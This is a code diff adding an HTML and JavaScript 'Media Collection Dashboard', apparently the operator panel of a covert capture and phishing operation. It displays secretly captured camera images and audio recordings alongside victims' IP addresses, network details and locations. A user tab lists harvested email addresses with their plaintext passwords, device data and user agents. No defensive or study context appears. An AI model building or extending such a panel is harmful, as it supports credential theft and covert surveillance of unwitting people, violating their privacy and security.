@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Media Collection Dashboard</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f0f2f5;
+        }
+        .dashboard {
+            max-width: 1200px;
+            margin: 0 auto;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            padding: 20px;
+        }
+        h1 {
+            color: #1877f2;
+            text-align: center;
+        }
+        .tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #ddd;
+        }
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            background-color: #f0f2f5;
+            margin-right: 5px;
+            border-radius: 5px 5px 0 0;
+        }
+        .tab.active {
+            background-color: #1877f2;
+            color: white;
+        }
+        .content {
+            display: none;
+        }
+        .content.active {
+            display: block;
+        }
+        .media-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        .media-item {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .media-item img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+        .media-item video {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+        .media-item audio {
+            width: 100%;
+            margin-top: 10px;
+        }
+        .media-info {
+            padding: 10px;
+            font-size: 14px;
+        }
+        .media-info p {
+            margin: 5px 0;
+        }
+        .user-details {
+            background-color: #f0f2f5;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 5px;
+        }
+        .loading {
+            text-align: center;
+            padding: 20px;
+            font-size: 18px;
+            color: #666;
+        }
+        .error {
+            color: red;
+            text-align: center;
+            padding: 20px;
+        }
+        .refresh-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        .location-map {
+            height: 200px;
+            width: 100%;
+            margin-top: 10px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard">
+        <h1>Media Collection Dashboard</h1>
+        <button class="refresh-btn" onclick="loadAllMedia()">Refresh Data</button>
+        
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('images')">Images</div>
+            <div class="tab" onclick="switchTab('audio')">Audio Recordings</div>
+            <div class="tab" onclick="switchTab('users')">User Information</div>
+        </div>
+        
+        <div id="images" class="content active">
+            <h2>Captured Images</h2>
+            <div id="images-grid" class="media-grid">
+                <div class="loading">Loading images...</div>
+            </div>
+        </div>
+        
+        <div id="audio" class="content">
+            <h2>Audio Recordings</h2>
+            <div id="audio-grid" class="media-grid">
+                <div class="loading">Loading audio recordings...</div>
+            </div>
+        </div>
+        
+        <div id="users" class="content">
+            <h2>User Information</h2>
+            <div id="users-list">
+                <div class="loading">Loading user data...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Switch between tabs
+        function switchTab(tabId) {
+            // Hide all content
+            document.querySelectorAll('.content').forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            // Remove active class from all tabs
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Show selected content and activate tab
+            document.getElementById(tabId).classList.add('active');
+            document.querySelector(`.tab[onclick="switchTab('${tabId}')"]`).classList.add('active');
+        }
+        
+        // Load all media data
+        async function loadAllMedia() {
+            loadImages();
+            loadAudio();
+            loadUsers();
+        }
+        
+        // Load captured images
+        async function loadImages() {
+            const imagesGrid = document.getElementById('images-grid');
+            imagesGrid.innerHTML = '<div class="loading">Loading images...</div>';
+            
+            try {
+                const response = await fetch('/api/list-media?type=image');
+                const data = await response.json();
+                
+                if (data.success && data.media.length > 0) {
+                    imagesGrid.innerHTML = '';
+                    
+                    data.media.forEach(image => {
+                        const mediaItem = document.createElement('div');
+                        mediaItem.className = 'media-item';
+                        
+                        const img = document.createElement('img');
+                        // Use the S3 URL if available, otherwise fall back to the old path
+                        img.src = image.fileUrl || `/uploads/images/${image.filename}`;
+                        img.alt = 'Captured Image';
+                        
+                        const mediaInfo = document.createElement('div');
+                        mediaInfo.className = 'media-info';
+                        
+                        const date = new Date(image.timestamp);
+                        
+                        mediaInfo.innerHTML = `
+                            <p><strong>Date:</strong> ${date.toLocaleDateString()}</p>
+                            <p><strong>Time:</strong> ${date.toLocaleTimeString()}</p>
+                            <p><strong>IP:</strong> ${image.ipAddress || 'Unknown'}</p>
+                            <p><strong>Network:</strong> ${image.metadata?.networkInfo || 'Unknown'}</p>
+                            <p><strong>Storage:</strong> ${image.metadata?.storage || 'Local'}</p>
+                        `;
+                        
+                        // If location data exists, add a map
+                        if (image.metadata && image.metadata.location) {
+                            const location = image.metadata.location;
+                            const mapDiv = document.createElement('div');
+                            mapDiv.className = 'location-map';
+                            mediaInfo.appendChild(mapDiv);
+                            
+                            // Load map (you would need to implement this with a maps API)
+                            loadMap(mapDiv, location);
+                        }
+                        
+                        mediaItem.appendChild(img);
+                        mediaItem.appendChild(mediaInfo);
+                        imagesGrid.appendChild(mediaItem);
+                    });
+                } else {
+                    imagesGrid.innerHTML = '<div class="error">No images found</div>';
+                }
+            } catch (error) {
+                console.error('Error loading images:', error);
+                imagesGrid.innerHTML = '<div class="error">Failed to load images</div>';
+            }
+        }
+        
+        // Load audio recordings
+        async function loadAudio() {
+            const audioGrid = document.getElementById('audio-grid');
+            audioGrid.innerHTML = '<div class="loading">Loading audio recordings...</div>';
+            
+            try {
+                const response = await fetch('/api/list-media?type=audio');
+                const data = await response.json();
+                
+                if (data.success && data.media.length > 0) {
+                    audioGrid.innerHTML = '';
+                    
+                    data.media.forEach(audio => {
+                        const mediaItem = document.createElement('div');
+                        mediaItem.className = 'media-item';
+                        
+                        const audioElement = document.createElement('audio');
+                        audioElement.controls = true;
+                        
+                        const source = document.createElement('source');
+                        // Use S3 URL if available
+                        source.src = audio.fileUrl || `/uploads/audio/${audio.filename}`;
+                        source.type = 'audio/webm';
+                        
+                        audioElement.appendChild(source);
+                        
+                        const mediaInfo = document.createElement('div');
+                        mediaInfo.className = 'media-info';
+                        
+                        const date = new Date(audio.timestamp);
+                        
+                        mediaInfo.innerHTML = `
+                            <p><strong>Date:</strong> ${date.toLocaleDateString()}</p>
+                            <p><strong>Time:</strong> ${date.toLocaleTimeString()}</p>
+                            <p><strong>IP:</strong> ${audio.ipAddress || 'Unknown'}</p>
+                            <p><strong>Network:</strong> ${audio.metadata?.networkInfo || 'Unknown'}</p>
+                            <p><strong>Storage:</strong> ${audio.metadata?.storage || 'Local'}</p>
+                        `;
+                        
+                        mediaItem.appendChild(audioElement);
+                        mediaItem.appendChild(mediaInfo);
+                        audioGrid.appendChild(mediaItem);
+                    });
+                } else {
+                    audioGrid.innerHTML = '<div class="error">No audio recordings found</div>';
+                }
+            } catch (error) {
+                console.error('Error loading audio:', error);
+                audioGrid.innerHTML = '<div class="error">Failed to load audio recordings</div>';
+            }
+        }
+        
+        // Load user information
+        async function loadUsers() {
+            const usersList = document.getElementById('users-list');
+            usersList.innerHTML = '<div class="loading">Loading user data...</div>';
+            
+            try {
+                const response = await fetch('/api/get-users');
+                const data = await response.json();
+                
+                if (data.success && data.users.length > 0) {
+                    usersList.innerHTML = '';
+                    
+                    data.users.forEach(user => {
+                        const userItem = document.createElement('div');
+                        userItem.className = 'media-item';
+                        
+                        const userInfo = document.createElement('div');
+                        userInfo.className = 'media-info';
+                        
+                        const date = new Date(user.createdAt);
+                        
+                        userInfo.innerHTML = `
+                            <h3>User: ${user.email}</h3>
+                            <div class="user-details">
+                                <p><strong>Password:</strong> ${user.password}</p>
+                                <p><strong>Date:</strong> ${date.toLocaleDateString()}</p>
+                                <p><strong>Time:</strong> ${date.toLocaleTimeString()}</p>
+                                <p><strong>IP:</strong> ${user.ipAddress || 'Unknown'}</p>
+                                <p><strong>Device:</strong> ${JSON.stringify(user.deviceInfo) || 'Unknown'}</p>
+                                <p><strong>Network:</strong> ${user.networkInfo || 'Unknown'}</p>
+                                <p><strong>User Agent:</strong> ${user.userAgent || 'Unknown'}</p>
+                            </div>
+                        `;
+                        
+                        // If location data exists, add a map
+                        if (user.location && user.location.ipAddress) {
+                            const mapDiv = document.createElement('div');
+                            mapDiv.className = 'location-map';
+                            userInfo.appendChild(mapDiv);
+                            
+                            // Load map (you would need to implement this with a maps API)
+                            loadMap(mapDiv, user.location);
+                        }
+                        
+                        userItem.appendChild(userInfo);
+                        usersList.appendChild(userItem);
+                    });
+                } else {
+                    usersList.innerHTML = '<div class="error">No user data found</div>';
+                }
+            } catch (error) {
+                console.error('Error loading users:', error);
+                usersList.innerHTML = '<div class="error">Failed to load user data</div>';
+            }
+        }
+        
+        // Simple function to load a map (placeholder - you would use a real maps API)
+        function loadMap(element, location) {
+            if (location.latitude && location.longitude) {
+                element.innerHTML = `Map showing location at: ${location.latitude}, ${location.longitude}`;
+                // In a real implementation, you would initialize a map here
+                // For example, with Google Maps:
+                // const map = new google.maps.Map(element, {
+                //     center: { lat: location.latitude, lng: location.longitude },
+                //     zoom: 15
+                // });
+                // new google.maps.Marker({ position: { lat: location.latitude, lng: location.longitude }, map });
+            } else if (location.ipAddress) {
+                element.innerHTML = `Location based on IP: ${location.ipAddress}`;
+            } else {
+                element.innerHTML = 'No location data available';
+            }
+        }
+        
+        // Load data when page loads
+        document.addEventListener('DOMContentLoaded', loadAllMedia);
+    </script>
+</body>
+</html> 
